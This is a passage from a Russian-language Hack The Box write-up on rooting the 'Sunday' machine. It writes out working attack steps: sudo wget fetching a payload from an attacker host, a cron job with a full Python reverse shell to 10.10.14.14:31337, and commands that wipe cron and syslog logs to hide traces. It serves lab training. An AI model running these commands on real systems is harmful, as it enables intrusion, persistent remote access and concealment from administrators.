/usr/bin/atrm
/usr/bin/at
/usr/bin/sudoedit
/usr/bin/fdformat
/usr/bin/i86/w
/usr/bin/i86/newtask
/usr/bin/i86/uptime
/usr/bin/passwd
/usr/bin/su
```

Выберем для наших коварных планов перезаписи утилиту удаленного копирования `/usr/bin/rcp`. Видим установленный **setuid**, значит файл будет запущен от имени владельца:
```text
sammy@sunday:~$ ls -la /usr/bin/rcp
-r-sr-xr-x 1 root bin 291 2018-10-08 16:39 /usr/bin/rcp
```

Поменяем в нашем Python-скрипте шелл с `/bin/bash`'а на простой `/bin/sh` (т. к. [bash не уважает SUID](https://unix.stackexchange.com/questions/74527/setuid-bit-seems-to-have-no-effect-on-bash "linux - Setuid bit seems to have no effect on bash - Unix & Linux Stack Exchange")), перезапишем rcp (предварительно сделав копию, конечно же), запустим его:
```text
sammy@sunday:~# cp /usr/bin/rcp /tmp/rcp.bak

sammy@sunday:~$ sudo /usr/bin/wget 10.10.14.14:8881/sh3ll.py -O /usr/bin/passwd
--20:57:00--  http://10.10.14.14:8881/sh3ll.py
           => `/usr/bin/passwd'
Connecting to 10.10.14.14:8881... connected.
HTTP request sent, awaiting response... 200 OK
Length: 289 [application/octet-stream]

100%[=================================================>] 289           --.--K/s

20:57:00 (18.92 MB/s) - `/usr/bin/passwd' saved [289/289]


sammy@sunday:~$ rcp

```

И получим незамедлительный ответ!
```text
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.10.10.76.
Ncat: Connection from 10.10.10.76:62124.

# whoami
whoami
root

# id
id
uid=101(sammy) gid=10(staff) euid=0(root) groups=10(staff)
```

```text
# cat /root/root.txt
cat /root/root.txt
fb40fab6????????????????????????
```

Не забываем восстановить оригинальный rcp, когда наигрались с рут-сессией:
```text
sammy@sunday:~# mv /tmp/rcp.bak /usr/bin/rcp
```

### 7. cron
Последний способ получения рута, который я опишу в рамках этого поста, это создание вредоносной cron-задачи.

Проверим, что cron запущен:
```text
sammy@sunday:~$ ps auxww | grep cron
root     17724  0.0  0.1 4340 1304 ?        S 12:10:09  0:00 /usr/sbin/cron

sammy@sunday:~$ svcs -p svc:/system/cron
STATE          STIME    FMRI
online         12:10:09 svc:/system/cron:default
               12:10:09    17724 cron
```

На локальной машине создадим файл с нужным job'ом (хотим, чтобы Sunday пробрасывал шелл на нашу машину каждую минуту):
```text
root@kali:~# cat cronjob
* * * * * /usr/bin/python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",31337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()' > /dev/null 2>&1
```

Загрузим нашу прелесть на жертву в суперпользовательский crontab:
```text
sammy@sunday:~$ sudo /usr/bin/wget 10.10.14.14:8881/cronjob -O /var/spool/cron/crontabs/root
--12:30:12--  http://10.10.14.14:8881/cronjob
           => `/var/spool/cron/crontabs/root'
Connecting to 10.10.14.14:8881... connected.
HTTP request sent, awaiting response... 200 OK
Length: 287 [application/octet-stream]

100%[=================================================>] 287           --.--K/s

12:30:13 (40.79 MB/s) - `/var/spool/cron/crontabs/root' saved [287/287]
```

Перезапустим cron, чтобы он увидел изменения (т. к. создавали задание не через `crontab`):
```text
sammy@sunday:~$ svcadm restart cron
```

И через пару секунд получим отстук на netcat, а там уже привычное:
```text
root@kali:~# nc -nlvvp 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.10.10.76.
Ncat: Connection from 10.10.10.76:56297.

root@sunday:~# whoami
root

root@sunday:~# id
uid=0(root) gid=0(root)

root@sunday:~# cat /root/root.txt
fb40fab6????????????????????????
```

В логах (которые мы сейчас почистим) видно, что все прошло успешно:
```text
root@sunday:~# cat /var/cron/log
! *** cron started ***   pid = 19567 Thu Oct 11 12:30:19 2018
>  CMD: /usr/bin/python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",31337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()' > /dev/null 2>&1
>  root 19947 c Thu Oct 11 12:31
```

```text
root@sunday:~# > /var/cron/log
root@sunday:~# > /var/log/syslog
```

Фух, пожалуй на этом все с рутом :triumph:

# Разное
## overwrite
В домашней директории суперпользователя лежит преинтереснейший файл, который не могу не показать:
```text
root@sunday:~# ls -la
total 18
drwx------  6 root root   13 2018-04-24 10:31 .
drwxr-xr-x 26 root root   27 2018-04-24 12:57 ..
-rw-r--r--  1 root root  280 2009-05-14 21:18 .bashrc
drwx------  3 root root    3 2018-04-15 20:22 .config
drwx------  3 root root    3 2018-10-08 18:33 .gconf
drwx------  2 root root    3 2018-04-15 20:23 .gconfd
-rwx------  1 root root  112 2018-04-24 10:48 overwrite
-rw-r--r--  1 root root  611 2009-05-14 21:18 .profile
-rw-------  1 root root 1365 2018-04-15 20:23 .recently-used.xbel
-r--------  1 root root   33 2018-04-15 20:38 root.txt
drwx------  3 root root    3 2018-04-15 20:30 .sunw
-r-x--x--x  1 root root   53 2018-10-08 21:10 troll
-rw-------  1 root root   53 2018-04-24 10:35 troll.original
```

```text
root@sunday:~# cat overwrite
#!/usr/bin/bash

while true; do
        /usr/gnu/bin/cat /root/troll.original > /root/troll
        /usr/gnu/bin/sleep 5
done
```

```text
root@sunday:~# ps auxww | grep overwrite
root       517  0.1  0.1 5928 2180 ?        S 16:05:38  0:02 /usr/bin/bash /root/overwrite
```

Встречайте: ~~`overkill`~~ `overwrite` — скрипт, перезаписывающий `/root/troll`, оригинальным содержимым раз в 5 секунд. Поэтому ранее говорилось о том, что с первого раза диверсия по подмене troll'а могла не получиться.

## agent22.backup
```text
root@sunday:~# ls -la /backup
total 5
drwxr-xr-x  2 root root   4 2018-04-15 20:44 .
drwxr-xr-x 26 root root  27 2018-04-24 12:57 ..
-r-x--x--x  1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r--  1 root root 319 2018-04-15 20:44 shadow.backup
```

```text
root@sunday:~# cat /backup/agent22.backup
#!/usr/bin/bash

/usr/bin/echo "testing"
/usr/bin/id
```

Когда мы гуляли по файловой системе под пользователем *sunny*, в директории `/backup` рядом с хешами паролей лежал еще один файл (`agent22.backup`), просмотреть который мы не могли (который носит имя создателя машины, кстати). Внутри оказалось то же самое, что и в `/root/troll` — файлы идентичны. Самое интересное в другом: если посмотреть на биты прав доступа, можно заметить, что несмотря на то, что мы не можем прочитать файл, мы можем его исполнить. Давайте попробуем это сделать:
```text
sunny@sunday:/backup$ ./agent22.backup
/usr/bin/bash: ./agent22.backup: Permission denied
```

Запрет. Почему?

Ответ прост: когда речь заходит о выполнении файлов (типа такого `./executable`), то возможны 2 ситуации:
  1. Этот файл — бинарник (ELF), и тогда ядро сначала проверяет наличие необходимых прав у пользователя, запросившего выполнение, а потом только читает его (файл) и загружает в память.
  2. Этот файл — скрипт интерпретируемого языка (python, bash, perl и т. д.), и в этом случае сначала интерпретатор загружается в память от имени текущего пользователя, а уже после этого интерпретатор читает и выполняет файл.

Наш случай второй. Так как это bash-скрипт, то выполнять (выполнять = **прочитать содержимое** + запустить) его будет, очевидно, bash-интерпретатор, который в свою очередь запущен от имени *sunny*, и у которого поэтому не достаточно прав для прочтения файла со скриптом. Тайна раскрыта!

Хорошего воскресенья, спасибо за внимание :innocent:

![sunday-owned.png]({{ "/img/htb/boxes/sunday/sunday-owned.png" | relative_url }})
